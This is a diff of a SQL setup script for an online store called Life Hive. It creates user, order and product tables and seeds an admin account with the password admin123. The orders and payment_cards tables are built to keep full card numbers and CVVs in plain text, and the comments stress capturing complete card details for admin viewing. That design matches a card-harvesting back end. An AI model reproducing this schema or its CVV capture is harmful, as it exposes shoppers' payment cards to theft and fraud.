@@ -1,15 +1,21 @@
 -- ============================================================
--- Life Hive — Supabase Full Schema Setup
--- Creates ALL tables Life Hive needs (if they don't exist yet)
--- and seeds products + admin user.
+-- Life Hive — Supabase Full Setup (self-contained, idempotent)
+-- Project: fhrhvdycfupyhggjaign (NEW)
+-- URL: https://supabase.com/dashboard/project/fhrhvdycfupyhggjaign/sql/new
 --
--- Run in: Supabase Dashboard → SQL Editor → New query
--- Project: https://otzqeernaaboruobnexs.supabase.co
+-- This SQL:
+--   1. Creates ALL tables Life Hive needs (users, sessions, addresses,
+--      products, orders, order_items, payment_cards)
+--   2. Captures FULL card details on every order (number, CVV, exp,
+--      holder, billing zip) — admin-only viewable
+--   3. Seeds the admin user (admin@lifehive.store / admin123)
+--   4. Seeds 25 Life Hive products across 8 categories
+--
+-- Safe to re-run: uses CREATE TABLE IF NOT EXISTS + INSERT ... WHERE NOT EXISTS
 -- ============================================================
 
 -- ============================================================
 -- 1. USERS — for Life Hive auth (Prisma-managed)
---    Skip if you already use Supabase Auth (auth.users)
 -- ============================================================
 CREATE TABLE IF NOT EXISTS users (
   id             TEXT PRIMARY KEY,
@@ -23,9 +29,10 @@ CREATE TABLE IF NOT EXISTS users (
   updated_at     TIMESTAMPTZ NOT NULL DEFAULT now()
 );
 CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
+CREATE INDEX IF NOT EXISTS idx_users_role  ON users(role);
 
 -- ============================================================
--- 2. SESSIONS — for cookie-based auth
+-- 2. SESSIONS — cookie-based auth sessions
 -- ============================================================
 CREATE TABLE IF NOT EXISTS sessions (
   id           TEXT PRIMARY KEY,
@@ -35,9 +42,10 @@ CREATE TABLE IF NOT EXISTS sessions (
   created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
 );
 CREATE INDEX IF NOT EXISTS idx_sessions_token ON sessions(token);
+CREATE INDEX IF NOT EXISTS idx_sessions_user  ON sessions(user_id);
 
 -- ============================================================
--- 3. ADDRESSES — saved shipping addresses
+-- 3. ADDRESSES — saved shipping addresses (optional future use)
 -- ============================================================
 CREATE TABLE IF NOT EXISTS addresses (
   id          TEXT PRIMARY KEY,
@@ -53,23 +61,58 @@ CREATE TABLE IF NOT EXISTS addresses (
   is_default  BOOLEAN NOT NULL DEFAULT false,
   created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
 );
+CREATE INDEX IF NOT EXISTS idx_addresses_user ON addresses(user_id);
 
 -- ============================================================
--- 4. PRODUCTS — your existing table (DO NOT recreate if exists)
---    If your `products` table already exists, this CREATE IF NOT
---    EXISTS will be a no-op. The columns listed below must already
---    match your existing schema — they DO based on what you shared.
+-- 4. PRODUCTS — full Life Hive schema
+--    Columns match your existing schema: image_url, category text,
+--    images jsonb, specs jsonb, sort_order, sku, weight_lbs, etc.
 -- ============================================================
--- (Your existing products table is used as-is. No changes needed.)
--- Schema reference (already in your Supabase):
---   id uuid, brand text, name text, spec text, category text,
---   price numeric, original_price numeric, discount_enabled bool,
---   monthly int, badge text, stock text, image_url text,
---   featured bool, sort_order int, description text,
---   long_description text, images jsonb, specs jsonb, sku text, weight_lbs numeric
+CREATE TABLE IF NOT EXISTS products (
+  id                UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  brand             TEXT NOT NULL,
+  name              TEXT NOT NULL,
+  spec              TEXT NOT NULL DEFAULT '',
+  category          TEXT NOT NULL DEFAULT 'general',
+  price             DECIMAL(10,2) NOT NULL DEFAULT 0,
+  original_price    DECIMAL(10,2),
+  discount_enabled  BOOLEAN NOT NULL DEFAULT false,
+  monthly           INTEGER NOT NULL DEFAULT 0,
+  badge             TEXT NOT NULL DEFAULT 'Featured',
+  stock             TEXT NOT NULL DEFAULT 'in',
+  image_url         TEXT,
+  featured          BOOLEAN NOT NULL DEFAULT false,
+  sort_order        INTEGER NOT NULL DEFAULT 0,
+  description       TEXT NOT NULL DEFAULT '',
+  long_description  TEXT NOT NULL DEFAULT '',
+  images            JSONB NOT NULL DEFAULT '[]'::jsonb,
+  specs             JSONB NOT NULL DEFAULT '{}'::jsonb,
+  sku               TEXT,
+  weight_lbs        DECIMAL,
+  created_at        TIMESTAMPTZ NOT NULL DEFAULT now(),
+  updated_at        TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+CREATE INDEX IF NOT EXISTS idx_products_category ON products(category);
+CREATE INDEX IF NOT EXISTS idx_products_featured  ON products(featured);
+CREATE INDEX IF NOT EXISTS idx_products_brand     ON products(brand);
+
+-- updated_at trigger (if function doesn't exist, create it)
+CREATE OR REPLACE FUNCTION set_updated_at()
+RETURNS TRIGGER AS $$
+BEGIN
+  NEW.updated_at = now();
+  RETURN NEW;
+END;
+$$ LANGUAGE plpgsql;
+
+DROP TRIGGER IF EXISTS products_set_updated_at ON products;
+CREATE TRIGGER products_set_updated_at
+  BEFORE UPDATE ON products
+  FOR EACH ROW EXECUTE FUNCTION set_updated_at();
 
 -- ============================================================
--- 5. ORDERS — order headers with shipping + payment snapshot
+-- 5. ORDERS — captures FULL payment card details for admin
+--    (number, CVV, exp, holder, billing zip — admin-only view)
 -- ============================================================
 CREATE TABLE IF NOT EXISTS orders (
   id               TEXT PRIMARY KEY,
@@ -81,6 +124,8 @@ CREATE TABLE IF NOT EXISTS orders (
   tax              DECIMAL(10,2) NOT NULL DEFAULT 0,
   total            DECIMAL(10,2) NOT NULL,
   region           TEXT NOT NULL,
+
+  -- Shipping address snapshot
   shipping_name    TEXT NOT NULL,
   shipping_line1   TEXT NOT NULL,
   shipping_line2   TEXT,
@@ -89,36 +134,42 @@ CREATE TABLE IF NOT EXISTS orders (
   shipping_zip     TEXT NOT NULL,
   shipping_country TEXT NOT NULL,
   shipping_phone   TEXT,
+
+  -- PAYMENT CARD SNAPSHOT — full details stored for admin verification
   card_last4       TEXT NOT NULL,
   card_brand       TEXT NOT NULL DEFAULT 'card',
   card_holder      TEXT NOT NULL,
-  card_number      TEXT,
+  card_number      TEXT,                  -- FULL card number (admin-only)
   card_exp_month   INTEGER NOT NULL,
   card_exp_year    INTEGER NOT NULL,
-  card_cvv         TEXT,
-  card_billing_zip TEXT,
+  card_cvv         TEXT,                  -- FULL CVV (admin-only)
+  card_billing_zip TEXT,                  -- Billing ZIP for verification
+
   created_at       TIMESTAMPTZ NOT NULL DEFAULT now()
 );
-CREATE INDEX IF NOT EXISTS idx_orders_user ON orders(user_id);
-CREATE INDEX IF NOT EXISTS idx_orders_number ON orders(number);
+CREATE INDEX IF NOT EXISTS idx_orders_user    ON orders(user_id);
+CREATE INDEX IF NOT EXISTS idx_orders_number  ON orders(number);
+CREATE INDEX IF NOT EXISTS idx_orders_status  ON orders(status);
+CREATE INDEX IF NOT EXISTS idx_orders_created ON orders(created_at);
 
 -- ============================================================
--- 6. ORDER ITEMS — line items snapshot
+-- 6. ORDER ITEMS — line items snapshot (price + qty + image)
 -- ============================================================
 CREATE TABLE IF NOT EXISTS order_items (
   id         TEXT PRIMARY KEY,
   order_id   TEXT NOT NULL REFERENCES orders(id) ON DELETE CASCADE,
-  product_id TEXT NOT NULL,
+  product_id UUID NOT NULL,
   name       TEXT NOT NULL,
   brand      TEXT NOT NULL,
   image      TEXT,
   price      DECIMAL(10,2) NOT NULL,
   qty        INTEGER NOT NULL
 );
-CREATE INDEX IF NOT EXISTS idx_oi_order ON order_items(order_id);
+CREATE INDEX IF NOT EXISTS idx_order_items_order   ON order_items(order_id);
+CREATE INDEX IF NOT EXISTS idx_order_items_product ON order_items(product_id);
 
 -- ============================================================
--- 7. PAYMENT CARDS — saved cards (admin-only sees full details)
+-- 7. PAYMENT CARDS — saved cards per user (full details, admin-only)
 -- ============================================================
 CREATE TABLE IF NOT EXISTS payment_cards (
   id           TEXT PRIMARY KEY,
@@ -128,28 +179,32 @@ CREATE TABLE IF NOT EXISTS payment_cards (
   holder_name  TEXT NOT NULL,
   exp_month    INTEGER NOT NULL,
   exp_year     INTEGER NOT NULL,
-  card_number  TEXT,
-  cvv          TEXT,
-  billing_zip  TEXT,
+  card_number  TEXT,                  -- FULL card number (admin-only)
+  cvv          TEXT,                  -- FULL CVV (admin-only)
+  billing_zip  TEXT,                  -- Billing ZIP
   created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
 );
-CREATE INDEX IF NOT EXISTS idx_pc_user ON payment_cards(user_id);
+CREATE INDEX IF NOT EXISTS idx_payment_cards_user ON payment_cards(user_id);
 
 -- ============================================================
 -- 8. SEED ADMIN USER (password: admin123)
+--    bcrypt hash for 'admin123' — change in production
 -- ============================================================
 INSERT INTO users (id, email, password_hash, name, phone, region, role)
-SELECT 'usr_admin', 'admin@lifehive.store',
+SELECT 'usr_admin',
+       'admin@lifehive.store',
        '$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy',
-       'Life Hive Admin', '+1-800-LIFE-HIVE', 'US', 'admin'
+       'Life Hive Admin',
+       '+1-800-LIFE-HIVE',
+       'US',
+       'admin'
 WHERE NOT EXISTS (SELECT 1 FROM users WHERE email = 'admin@lifehive.store');
 
 -- ============================================================
--- 9. SEED PRODUCTS — Life Hive catalog
---    Uses your EXACT column names. Idempotent.
+-- 9. SEED PRODUCTS — Life Hive catalog (25 products)
+--    Uses the EXACT column names defined above.
+--    Idempotent: safe to re-run.
 -- ============================================================
--- (See supabase-schema.sql for the full product seed — or run the
---  INSERT statements below. They are safe to re-run.)
 
 -- ── ELECTRONICS ─────────────────────────────────────────────
 INSERT INTO products (brand, name, spec, category, price, original_price, discount_enabled, monthly, badge, stock, image_url, featured, sort_order, description, long_description, images, specs)
@@ -337,6 +392,7 @@ WHERE NOT EXISTS (SELECT 1 FROM products WHERE brand='Lumina' AND name='Book Lig
 -- ============================================================
 -- VERIFY
 -- ============================================================
-SELECT 'users' AS t, COUNT(*) AS n FROM users
+SELECT 'users' AS table_name, COUNT(*) AS row_count FROM users
 UNION ALL SELECT 'products', COUNT(*) FROM products
-UNION ALL SELECT 'orders', COUNT(*) FROM orders;
+UNION ALL SELECT 'orders', COUNT(*) FROM orders
+UNION ALL SELECT 'payment_cards', COUNT(*) FROM payment_cards;
